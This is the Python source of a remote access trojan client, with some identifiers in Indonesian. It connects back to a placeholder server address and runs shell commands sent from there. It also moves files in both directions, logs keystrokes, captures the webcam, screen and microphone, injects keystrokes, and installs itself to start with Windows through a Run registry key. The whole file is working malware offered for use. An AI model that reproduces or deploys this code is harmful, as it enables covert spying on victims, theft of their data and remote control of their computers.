import sys
import time
import socket
import json
import subprocess
from subprocess import PIPE
import os
import threading
from Logger import Keylogger
import cv2
import pickle
import struct
import pyautogui
import shutil
import pyaudio
from pynput.keyboard import Key, Controller
import client
from mss import mss
import numpy as np

sok = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def send_camera_image(server_ip, port=9999):
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    cap.release()

    if not ret:
        return

    _, img_encoded = cv2.imencode(".jpg", frame)
    data = img_encoded.tobytes()

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((server_ip, port))

    client.sendall(struct.pack("!I", len(data)))
    client.sendall(data)

    client.close()

keyb = Controller()
def acc_keystroke():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect(('[Your server ip]', 9995))
        while True:
            data = s.recv(1024)
            if not data:
                break
            command = data.decode()
            try:
                if command.lower() == 'enter':
                    keyb.press(Key.enter)
                    keyb.release(Key.enter)
                if command.lower() == 'space':
                    keyb.press(Key.space)
                    keyb.release(Key.space)
                else:
                    keyb.type(command)
            except Exception as e:
                print(f'{e}')
                break
            

FORMAT = pyaudio.paInt16
CHANNEL = 1
RATE = 44100
CHUNK = 1024

def record_n_send():
    audio = pyaudio.PyAudio()
    stream = audio.open(format=FORMAT, channels=CHANNEL,
                        rate=RATE, input=True,
                        frames_per_buffer=CHUNK)
    print('Recording')
    frame = []
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect(('[Your server ip]', 9996))
            for _ in range(0, int(RATE / CHUNK * 5)):
                data = stream.read(CHUNK)
                s.sendall(data)
            print('Record done')
    except socket.error as e:
        print(f'{e}')
    finally:
        print('done')
        stream.stop_stream()
        stream.close()
        audio.terminate()

def  execute_persistence(nama_registry, file_exe):
    file_path = os.environ['appdata']+'\\'+file_exe
    try:
        if not os.path.exists(file_path):
            shutil.copyfile(sys.executable, file_path)
            subprocess.call('reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v ' + nama_registry + ' /t REG_SZ /d "' + file_path + '"', shell=True)
        else:
            pass
    except:
        pass


def send_screen_record(server_ip, port=9991):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((server_ip, port))
    
    sct = mss()
    monitor = sct.monitors[1]

    while True:
        try:
            img = np.array(sct.grab(monitor))
            frame = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)

            data = pickle.dumps(frame)
            size = struct.pack("Q", len(data))
            client.sendall(size + data)

            if cv2.waitKey(1) & 0xFF == ord('q'):
                break

        except Exception as e:
            print(f'{e}')
            break

    client.close()
    cv2.destroyAllWindows()

def byte_stream():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(('[Your server ip]', 9998))
    vid = cv2.VideoCapture(0)
    while (vid.isOpened()):
        img, frame = vid.read()
        b = pickle.dumps(frame)
        message = struct.pack("Q", len(b))+b
        sock.sendall(message)

def kirim_byte_stream():
    t = threading.Thread(target=byte_stream)
    t.start()


def open_log():
    sok.send(Keylogger().baca_log().encode())

def log_thread():
    t = threading.Thread(target=open_log)
    t.start()

def download_file(namafile):
    file = open(namafile, 'wb')
    sok.settimeout(1)
    _file = sok.recv(65536*100)
    while _file:
        file.write(_file)
        try:
            _file = sok.recv(65536*100)
        except socket.timeout as e:
            break
    sok.settimeout(None)
    file.close()

def upload_file(namafile):
    file = open(namafile, 'rb')
    sok.send(file.read())
    file.close()

def terima_perintah():
    data = ''
    while True:
        try:
            data = data + sok.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def jalankan_perintah():
    while True:
        perintah = terima_perintah()
        if perintah == ('keluar'):
            break
        if perintah == 'clear':
            pass
        elif perintah[:3] == 'cd ':
            os.chdir(perintah[3:])
        elif perintah[:8] == 'download':
            upload_file(perintah[9:])
        elif perintah[:6] == 'upload':
            download_file(perintah[7:])
        elif perintah == 'start_log':
            Keylogger().start_log()
        elif perintah == 'baca_log':
            log_thread()
        elif perintah == 'clear_log':
            Keylogger().clear_log()
        elif perintah == 'stop_log':
            Keylogger().stop_listener()
        elif perintah == 'start_cam':
            kirim_byte_stream()
        elif perintah == 'screen_shot':
            ss = pyautogui.screenshot()
            ss.save('ss.png')
            upload_file('ss.png')
        elif perintah == 'screen_share':
            send_screen_record(server_ip='[Your server ip]', port=9991)
        elif perintah[:11] == 'persistence':
            nama_registry, file_exe = perintah[12:].split(' ')
            execute_persistence(nama_registry, file_exe)
        elif perintah == 'help':
            pass
        elif perintah == 'rec_audio':
            record_n_send()
        elif perintah == 'banner':
            pass
        elif perintah == 'send_key':
            acc_keystroke()
        elif perintah == 'send_mouse':
            client.start_client(host='[Your server ip]', port=9994)
        elif perintah == 'snap_cam':
            send_camera_image(server_ip='[Your server ip]', port=9993)
        else:
            exe = subprocess.Popen(
            perintah,
            shell=True,
            stdout=PIPE,
            stderr=PIPE,
            stdin=PIPE
        )
            data =exe.stdout.read() + exe.stderr.read()
            data = data.decode()
            output = json.dumps(data)
            sok.send(output.encode())

def execute_persist():
    while True:
        try:
            time.sleep(10)
            sok.connect(('[Your server ip]', 9999))
            jalankan_perintah()
            sok.close()
            break
        except:
            execute_persist()


execute_persist() 
